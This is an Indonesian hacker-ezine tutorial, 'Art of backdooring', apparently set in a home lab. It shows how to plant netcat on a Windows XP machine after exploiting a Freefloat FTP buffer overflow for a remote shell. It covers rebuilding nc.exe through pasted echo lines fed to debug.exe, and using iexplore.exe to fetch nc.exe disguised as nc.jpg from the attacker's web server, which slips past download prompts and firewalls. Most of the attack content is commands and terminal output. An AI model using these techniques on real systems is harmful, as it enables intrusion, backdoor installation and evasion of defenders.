@@ -1,0 +1,492 @@
+                  __                
+  __  __ /7  _   / /____  ()_     __
+,'o/,','/ \,'o| / //_ ,' /7/ \/7,'o/
+|_( \_\/n_/|_,'/ / ,'__////_n_/ |_( 
+              /_/                     
+ECHO MAGAZINE VOLUME XIII, ISSUE XXX, PHILE 0x007.TXT    
+				  
+				  
+Art of backdooring - Arief Tirtana
+teddy_arief.tirta/at/yahoo/dot/com
+
+Hallo everyone ..
+welcome and thanks for joining me :)
+
+-----| Introduction 
+	
+Ketika 	dalam sebuah penetrasi testing setelah mendapatkan remote
+shell. Banyak hal yang menarik yang bisa kita lakukan, eg. Tunneling,
+port forwarding, download credential, uploading backdoor, compile
+exploit, dan masih banyak hal yang menarik.  
+
+Di tutorial ini saya akan mendemontrasikan teknik file transfer yang
+unik.  Teknik ini merupakan alternatif teknik file transfer,jika
+teknik2 lain tidak memungkinkan bisa digunakan. Pada dasarnya file
+transfer bisa menggunakan TFTP.FTP ,SSH dsbg. Tapi berdasar pengalaman
+utilities2 tersebut dalam sebuah coorporate network yang solid, pasti
+akan terblokir firewall atau configurasi system yang tidak
+memungkinkan untuk melakukan file trasnfer ilegal dengan utilities2
+tersebut.  
+
+Salah satu teknik yang akan saya demokan, adalah menggunakan DEBUG.exe
+utillities ini secara default sudah terinstall di kebanyakan windows
+versi, dan juga tidak semua sysadmin menyadari  bahwa hanya dengan
+memanfaatkan DEBUG.exe attacker bisa mengirim/mengupload malicious
+file :-p. 
+
+berikut Proof Of Concept nya :)
+
+attacker : kali linux 1.6
+victim 	: windows xp Pro runing on vmware
+utilities : Debug.exe
+file yg dtransfer : nc.exe  
+
+-------| Teknik Backdoor Upload 1
+
+Debug.exe bisa berfungsi sebagai assembler, disambler maupun hex
+dumping tool, dalam teknik ini adalah kita mengubah file nc.exe
+(Binary file) menjadi hex/txt . Dan kemudian dengan exe2bat.exe kita
+ubah menjadi script yang pasteable di shell (echo command), yang
+kemudian debug,exe akan mengubah script tersbut menjadi kembali binary
+file secara otomatis. ada kelemahan menggunakan debug.exe, file size
+yang di transfer tidak lebih dari 64 kb.kita akan mengcompress file
+nc.exe dengan upx
+
+nc.exe (binary file) ------- > exe2bat.exe  -----> nc.txt (echo command)
+nc.txt (echo command) --------> debug.exe (windows) –------> nc.exe (binary file) 
+compress nc.exe dengan upx. Size ya berubah dari 59392 menjadi 29184 
+
++-----------------------------------
+| root@5h!n0b!:~/November# ls -l nc.exe 
+| -rwxr-xr-x 1 root root 59392 Dec  4 12:16 nc.exe 
+| root@5h!n0b!:~/November# upx nc.exe 
+|                       Ultimate Packer for eXecutables 
+|                          Copyright (C) 1996 - 2011 
+| UPX 3.08        Markus Oberhumer, Laszlo Molnar & John Reiser   Dec 12th 2011 
+|
+|         File size         Ratio      Format      Name 
+|    --------------------   ------   -----------   ----------- 
+|      59392 ->     29184   49.14%    win32/pe     nc.exe                        
+|
+| Packed 1 file. 
++-----------------------------------
+
+langkah selanjutnya adalah mengubah nc.exe menjadi nc.txt menggunakan
+exe2bat, dengan exe2bat  file nc.exe akan otomatis menjadi nc.txt yang
+pasteable di shell
+
++-----------------------------------
+| root@5h!n0b!:~/November# ls -l nc.exe 
+| -rwxr-xr-x 1 root root 29184 Dec  4 12:16 nc.exe 
+| root@5h!n0b!:~/November# wine /usr/share/windows-binaries/exe2bat.exe nc.exe nc.txt 
+| Finished: nc.exe > nc.txt 
+| root@5h!n0b!:~/November# ls -l 
+| total 340 
+| -rwxr-xr-x 1 root root  29184 Dec  4 12:16 nc.exe 
+| -rw-r--r-- 1 root root  97076 Dec  4 13:43 nc.txt 
+| root@5h!n0b!:~/November# 
++-----------------------------------
+
+setelah proses selesei, jika kita buka dengan text editor akan seperti
+ini. Text ini akan pasteable di shell, dan dibantu debug.exe akan
+otomatis berubah menjadi file binary kembali.
+
++-----------------------------------
+| echo 62 72 61 72 79 41 00 00 47 65 74 50 72 6f 63 41 64 64 72 65 73 73
+| 00 00 56 69 72 74 75 61 6c 50 72 6f 74 65 63 74 00 00 56 69 72 74 75
+| 61 6c 41 6c 6c 6f 63 00 00 56 69 72 74 75 61 6c 46 72 65 65 00 00 00
+| 45 78 69 74 50 72 6f 63 65 73 73 00 00 00 00 00 00 00 00 00 00 00 00
+| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex 
+| echo e 7200 >>123.hex 
+| echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 >>123.hex 
+| echo e 7280 >>123.hex 
+| echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex 
+| echo e 7300 >>123.hex 
+| echo  >>123.hex 
+| echo r cx >>123.hex 
+| echo 7200 >>123.hex 
+| echo w >>123.hex 
+| echo q >>123.hex 
+| debug<123.hex 
+| copy 1.dll nc.exe 
++-----------------------------------
+
+setelah semua persiapan selesai, saya akan mencoba exploit korban
+untuk mendaptkan remote shell, dalam tutorial ini saya akan
+menggunakan exploit ftp.
+
++-----------------------------------
+| root@5h!n0b!:~/November# python exploit.py 192.168.56.36 21 
+| ---------------------------------------------------------------- 
+| |      Freefloat FTP Server Buffer Overflow Vulnerability      | 
+| ---------------------------------------------------------------- ------
+| [-] Connecting to 192.168.56.36 on port 21 
+| [-] Sending exploit... 
+| [-] Exploit successfully sent... 
+| [-] Connect to 192.168.56.36 on port 4444 
+| root@5h!n0b!:~/November# telnet 192.168.56.36 4444 
+| Trying 192.168.56.36... 
+| Connected to 192.168.56.36. 
+| Escape character is '^]'. 
+| Microsoft Windows XP [Version 5.1.2600] 
+| (C) Copyright 1985-2001 Microsoft Corp. 
+| 
+| C:\Documents and Settings\HackerLab\Desktop\Win32>cd \ 
+| cd \ 
+| 
+| C:\>dir 
+| dir 
+|  Volume in drive C has no label. 
+|  Volume Serial Number is 5056-842A 
+| 
+|  Directory of C:\ 
+| 
+| 07/12/2012  09:37 PM                 0 AUTOEXEC.BAT 
+| 07/12/2012  09:37 PM                 0 CONFIG.SYS 
+| 11/17/2014  03:53 PM    <DIR>          Documents and Settings 
+| 11/02/2014  01:54 PM    <DIR>          Program Files 
+| 12/04/2014  01:53 PM    <DIR>          temp 
+| 11/05/2014  03:18 PM    <DIR>          WINDOWS 
+|                2 File(s)              0 bytes 
+|                4 Dir(s)   4,382,916,608 bytes free 
+| 
+| C:\> 
+| 
++-------------------------------------
+
+setelah kita mendapatkan shell korban, saatnya kita menupload malicous
+file kita, kita kembali ke text editor kita di atas, dan copy semua
+(nc.txt), dan langsung kita paste kan di remote shell kita, dan lihat
+apa yang terjadi … jika koneksi lancar diakhir proses akan seperti
+dibawah
+
++-------------------------------------
+| ---- truncated ----
+| 0AE4:7300  00.     00.     00. 
+| -e 7300 
+| 0AE4:7300  00. 
+| EC   00.     00. 
+| -r cx 
+| CX 0000 
+| :7200 
+| -w 
+| Writing 07200 bytes 
+| -q 
+| C:\>copy 1.dll nc.exe 
+|         1 file(s) copied. 
+| C:\> 
+| C:\>dir 
+| dir 
+| Volume in drive C has no label. 
+| Volume Serial Number is 5056-842A 
+| Directory of C:\ 
+|
+| 12/04/2014  02:00 PM            29,184 1.DLL 
+| 12/04/2014  02:00 PM            90,570 123.hex 
+| 07/12/2012  09:37 PM                 0 AUTOEXEC.BAT 
+| 07/12/2012  09:37 PM                 0 CONFIG.SYS 
+| 11/17/2014  03:53 PM    <DIR>          Documents and Settings 
+| 12/04/2014  02:00 PM            29,184 nc.exe 
+| 11/02/2014  01:54 PM    <DIR>          Program Files 
+| 12/04/2014  01:53 PM    <DIR>          temp 
+| 11/05/2014  03:18 PM    <DIR>          WINDOWS 
+|               5 File(s)        148,938 bytes 
+|               4 Dir(s)   4,382,826,496 bytes free 
+|
+|C:\> 
++-------------------------------------
+
+Lihat di atas, bahwa file nc.exe sukses ter transfer, ke shell remote
+:).  secara otomatis juga debug.exe akan mengubah file nc.txt menjadi
+kembali ke file nc.exe (binary file) lalu, apakah file nc.exe tesebut
+berfungsi?
+
++-------------------------------------
+| C:\>dir 
+| dir 
+|  Volume in drive C has no label. 
+|  Volume Serial Number is 5056-842A 
+| 
+|  Directory of C:\ 
+| 
+| 12/04/2014  02:00 PM            29,184 1.DLL 
+| 12/04/2014  02:00 PM            90,570 123.hex 
+| 07/12/2012  09:37 PM                 0 AUTOEXEC.BAT 
+| 07/12/2012  09:37 PM                 0 CONFIG.SYS 
+| 11/17/2014  03:53 PM    <DIR>          Documents and Settings 
+| 12/04/2014  02:00 PM            29,184 nc.exe 
+| 11/02/2014  01:54 PM    <DIR>          Program Files 
+| 12/04/2014  01:53 PM    <DIR>          temp 
+| 11/05/2014  03:18 PM    <DIR>          WINDOWS 
+|                5 File(s)        148,938 bytes 
+|                4 Dir(s)   4,382,826,496 bytes free 
+| 
+| C:\>nc.exe 
+| nc.exe 
+| Cmd line: 
+| 
++-------------------------------------
+
+yup file nc.exe berfungsi dengan sempurna.ha...ha...ha...  inilah
+contoh file transfer dengan menggunakan debug.exe, kemudian pertayaan
+saya kembalikan ke pembaca,, apakah anda pernah membayangkan bahkan
+pernah memikirkan penggunaan debug,exe untuk transfer file? Jika anda
+sebelumnya belum pernah memikirkan ya..  bagaimana jika anda seorang
+sysadmin?  Nach loee......
+
+F.A.Q
+
+1. Mengapa menggunakan teknik ini, sedangkan begitu banyak teknik yang
+lebih mudah di gunakan?
+– begitu banyaknya teknik file transfer , seperti TFTP, FTP, SSH dll,
+teknik ini sendiri merupakan teknik alternatif ketika protokol2
+tersebut terblokir oleh firewall.
+
+2.  Dalam kondisi apa teknik ini bisa digunakan?
+
+- dalam kondisi apapun bisa digunakan, terkecuali sang sysadmin telah
+  mendelete debug.exe.
+
+Update: debug.exe dalam windows 7 dan 8 sudah tidak lagi terinstall
+lagi secara default.  Tetapi di windows enterprise debux.exe masih
+terinstall
+
+
+-----| Teknik Backdoor upload  2 
+
+Dalam teknik yang kedua ini, akan lebih sedikit menarik, selalu saja
+ada jalan2 alternatif. dalam skenario ini ketika kita telah
+mendapatkan shell remote, setelah meng analisa, ternyata TFTP, FTP dan
+SSH tidak mendukung kita untuk membantu meng upload malicous file,
+terlebih lebih ternyata sang sysadmin telah menghapus debug.exe. Dan
+hanya ada 2 cara yang tersisa, vbscript downloader atau internet
+explorer.  What internet explorer, how we can make it? Yup kita bisa
+menggunakan internet explorer untuk upload file malicous kita. Begini
+skema ya
+
+1.http://Ipattacker/nc.exe ---> 2.shell remote ----> 3.internet explorer download direktori
+
+-------| keterangan:
+
+1.kita akan menggunakan apache,dan menyimpan nc.exe di webroot kita.
+2. dari remote shell kita ke directory dimana internet explorer
+tersimpan, dan dari situ kita akan menjalankan IE dengan mengarahkan
+url ke web apache kita.
+3. file nc. Akan otomatis tersimpana di folder download IE, dan dari
+situ kita akan memindahkan/mengesekusi file nc.exe (file malicous
+lainya) Untuk lebih jelasnya silakan lihat POC .
+
+Kita akan memindahkan file nc.exe ke webroot kita /var/www dan kita
+start apache service.
+
++---------------------------------------
+| root@5h!n0b!:/var/www# cp /usr/share/windows-binaries/nc.exe /var/www 
+| root@5h!n0b!:/var/www# ls -l nc.exe 
+| -rwxr-xr-x 1 root root 59392 Dec  5 14:49 nc.exe 
+| root@5h!n0b!:/var/www# /etc/init.d/apache2 start 
+| [....] Starting web server: apache2apache2: using 127.0.0.1 for ServerName . ok 
+| root@5h!n0b!:/var/www# 
++---------------------------------------
+
+langkah selanjutnya kita exploit korban untuk mendapatkan remote shell
+masih sama, saya menggunakan exploit floatFree Ftp.
+
++---------------------------------------
+| 
+| root@5h!n0b!:~/November# python exploit.py 192.168.56.36 21 
+| ---------------------------------------------------------------- 
+| |      Freefloat FTP Server Buffer Overflow Vulnerability      | 
+| ---------------------------------------------------------------- 
+| [-] Connecting to 192.168.56.36 on port 21 
+| [-] Sending exploit... 
+| [-] Exploit successfully sent... 
+| [-] Connect to 192.168.56.36 on port 4444 
+| root@5h!n0b!:~/November# telnet 192.168.56.36 4444 
+| Trying 192.168.56.36... 
+| Connected to 192.168.56.36. 
+| Escape character is '^]'. 
+| Microsoft Windows XP [Version 5.1.2600] 
+| (C) Copyright 1985-2001 Microsoft Corp. 
+|
+| C:\Documents and Settings\HackerLab\Desktop\Win32>cd \ 
+| cd \ 
+|
++---------------------------------------
+ 
+setelah kita mendapatkan remote shell, saya akan menuju direktory
+dimana internet explorer tersimpan … dan kita jalankan internet
+explore dari remote shell kita, dan kita arahakan url ke IP kita.
+ 
++---------------------------------------
+| root@5h!n0b!:~/November# telnet 192.168.56.36 4444 
+| Trying 192.168.56.36... 
+| Connected to 192.168.56.36. 
+| Escape character is '^]'. 
+| Microsoft Windows XP [Version 5.1.2600] 
+| (C) Copyright 1985-2001 Microsoft Corp. 
+| 
+| C:\Documents and Settings\HackerLab\Desktop\Win32>cd \ 
+| cd \ 
+| 
+| C:\>cd prog* 
+| cd prog* 
+| 
+| C:\Program Files>cd internet* 
+| cd internet* 
+| 
+| C:\Program Files\Internet Explorer>dir 
+| dir 
+|  Volume in drive C has no label. 
+|  Volume Serial Number is 5056-842A 
+| 
+|  Directory of C:\Program Files\Internet Explorer 
+| 
+| 07/12/2012  09:34 PM    <DIR>          . 
+| 07/12/2012  09:34 PM    <DIR>          .. 
+| 07/12/2012  09:34 PM    <DIR>          Connection Wizard 
+| 04/13/2008  09:41 PM            38,912 HMMAPI.DLL 
+| 04/13/2008  09:42 PM            18,432 iedw.exe 
+| 04/13/2008  09:42 PM            93,184 IEXPLORE.EXE 
+| 07/12/2012  10:16 PM    <DIR>          SIGNUP 
+|               3 File(s)        150,528 bytes 
+|               4 Dir(s)   4,362,473,472 bytes free 
+|
+| C:\Program Files\Internet Explorer> start iexplore.exe http://192.168.56.1/nc.exe 
+| start iexplore.exe http://192.168.56.1/nc.exe 
+| 
++---------------------------------------
+
+tetapi setelah kita eksekusi command tersebut akan muncul pop up/table
+prompt di dekstop victim yang mengintruksikan untuk “RUN” “SAVE”
+“CANCEL” untuk mendownload file tersebut, tetapi ingat kita di shell
+command CLI, kita tidak puya akses langsung terhadap pop up/table
+prompt di desktop tersebut, setelah sampai disini kita sedikit
+menggunakan trik, tetap selalu ada jalan, pertama kita ubah file
+nc.exe menjadi nc.jpg yang tersimpan di web root kita.
+
++---------------------------------------
+| root@5h!n0b!:/var/www# cp nc.exe nc.jpg 
+| root@5h!n0b!:/var/www# ls 
+| bitnami-wordpress-3.9-0-module-linux-installer.run  nc.exe  ptrace-kmod.c 
+| lampp                                               nc.jpg  wordpress 
+|  root@5h!n0b!:/var/www#      
++---------------------------------------
+
+selanjutnya kita jalankan internet explore kembali, dan di arahkan ke
+IP kita tetapi untuk kali ini kita akan mendownload file nc.jpg ….
+
+
++---------------------------------------
+|  Directory of C:\Program Files\Internet Explorer 
+|
+| 07/12/2012  09:34 PM    <DIR>          . 
+| 07/12/2012  09:34 PM    <DIR>          .. 
+| 07/12/2012  09:34 PM    <DIR>          Connection Wizard 
+| 04/13/2008  09:41 PM            38,912 HMMAPI.DLL 
+| 04/13/2008  09:42 PM            18,432 iedw.exe 
+| 04/13/2008  09:42 PM            93,184 IEXPLORE.EXE 
+| 07/12/2012  10:16 PM    <DIR>          SIGNUP 
+|                3 File(s)        150,528 bytes 
+|                4 Dir(s)   4,362,473,472 bytes free 
+| 
+| C:\Program Files\Internet Explorer> start iexplore.exe http://192.168.56.1/nc.jpg
+| start iexplore.exe http://192.168.56.1/nc.jpg
+| 
++---------------------------------------
+
+dan  untuk kali ini file tersebut akan terdownload otomatis. Tanpa ada
+popup/table prompt.  Selanjutnya kita menuju direktory file temporari
+internet explorer dari shel remote kita
+
++---------------------------------------
+| C:\Documents and Settings\HackerLab\Local Settings\Temporary Internet Files>dir
+| 
+| 12/04/2014  02:00 PM            29,184 nc.jpg 
+|                1File(s)       29,184 bytes 
+|                 
++---------------------------------------
+
+yup 1 file terdownload hi..hi...hi...hi … saatnya kita mengsekusi file
+tersebut untuk mengexpansi serangan kita... saya copy file tersebut ke
+dir C : setelah saya copy saya mencoba mengsekusi file tersebut dan
+apakah hasilnya ???
+
++---------------------------------------
+|  C:\>dir 
+| dir 
+| Volume in drive C has no label. 
+| Volume Serial Number is 5056-842A 
+|
+| Directory of C:\ 
+|
+| 12/04/2014  02:00 PM            29,184 1.DLL 
+| 12/04/2014  02:00 PM            90,570 123.hex 
+| 07/12/2012  09:37 PM                 0 AUTOEXEC.BAT 
+| 07/12/2012  09:37 PM                 0 CONFIG.SYS 
+| 11/17/2014  03:53 PM    <DIR>          Documents and Settings 
+| 12/04/2014  02:00 PM            29,184 nc.jpg 
+| 11/02/2014  01:54 PM    <DIR>          Program Files 
+| 12/07/2014  02:39 PM    <DIR>          temp 
+| 11/05/2014  03:18 PM    <DIR>          WINDOWS 
+|                5 File(s)        148,938 bytes 
+|                4 Dir(s)   4,362,399,744 bytes free 
+| 
+| C:\>nc.jpg 
+| nc.jpg 
+| Cmd line: 
+| 
++---------------------------------------
+
+ha...ha...ha file dapat terupload akhirnya... dan 100% berfungsi
+normal tanpa ada kendala, inilah sedikit teknik file transfer yang
+unik dan rahasia, ketika firewall dan configurasi system tidak
+memungkinkan untuk membantu kita mengupload file ke computer korban,
+dengan teknik yang simple ini kita bisa mengecoh firewall dll, dan
+karena alasan ini kenapa offensive-security team menyebutnya sebagai
+teknik transfer file yang ordinary ha..ha...ha.
+
+-----| Penutup
+
+Dua contoh di atas merupakan sebuah konsep sederhana file transfer,
+dan mungkin bagaimana jika dalam sebuah komputer target tidak terdapat
+debug.exe maupun internet explorer, apakah masih bisa kita upload
+sebuah malicous file??  saya jawab “BISA”. Lalu bagaimana. Gunakan
+vbscript downloader dan dengan sedikit dimodifikasi kita akan  masih
+bisa mengirim file2 malicous.  Dan sebagai penutupan, saya ucapkan
+terima kasih telah membaca artikel saya yang sederhana. :)
+
+-----| Thanks to 
+
+All my Family member 
+my Lovely Girlfriend love u sooo 
+my Teacher my Sensei Mr. Thomas Rodrigoes a.k.a "unknown" 
+my Friends Jhon Paul 1st. IT and Jasper 2nd. IT your my best team. 
+All Indonesian Backtrack Team staff and member 
+
+spesial thanks and greetz to : 
+echo staff and member. 
+this is my first artikel in ezine, I wish this artikel will publish hi...hi..hi :) 
+
+"jika saya bersedekah saya senang jika bersedekah bukan uang dan
+materi karena itu akan habis dan tidak abadi, kalau saya bersedekah
+beras 10 kg, mungkin akan habis dalam satu minggu. TAPI KALAU SAYA
+BERSEDEKAH DOA DAN ILMU,ITU AKAN MEMBUAT ORANG BISA MAKAN LEBIH DARI
+10 TAHUN" - Bob. Sadino 
+
+-----| Referensi
+
+[*] http://forums.offensive-security.com/forumdisplay.php?f=89
+[*] www.offensive-security.com/pwb-oscp
+[*] http://kipirvine.com/asm/debug 
+[*] and based on my experience
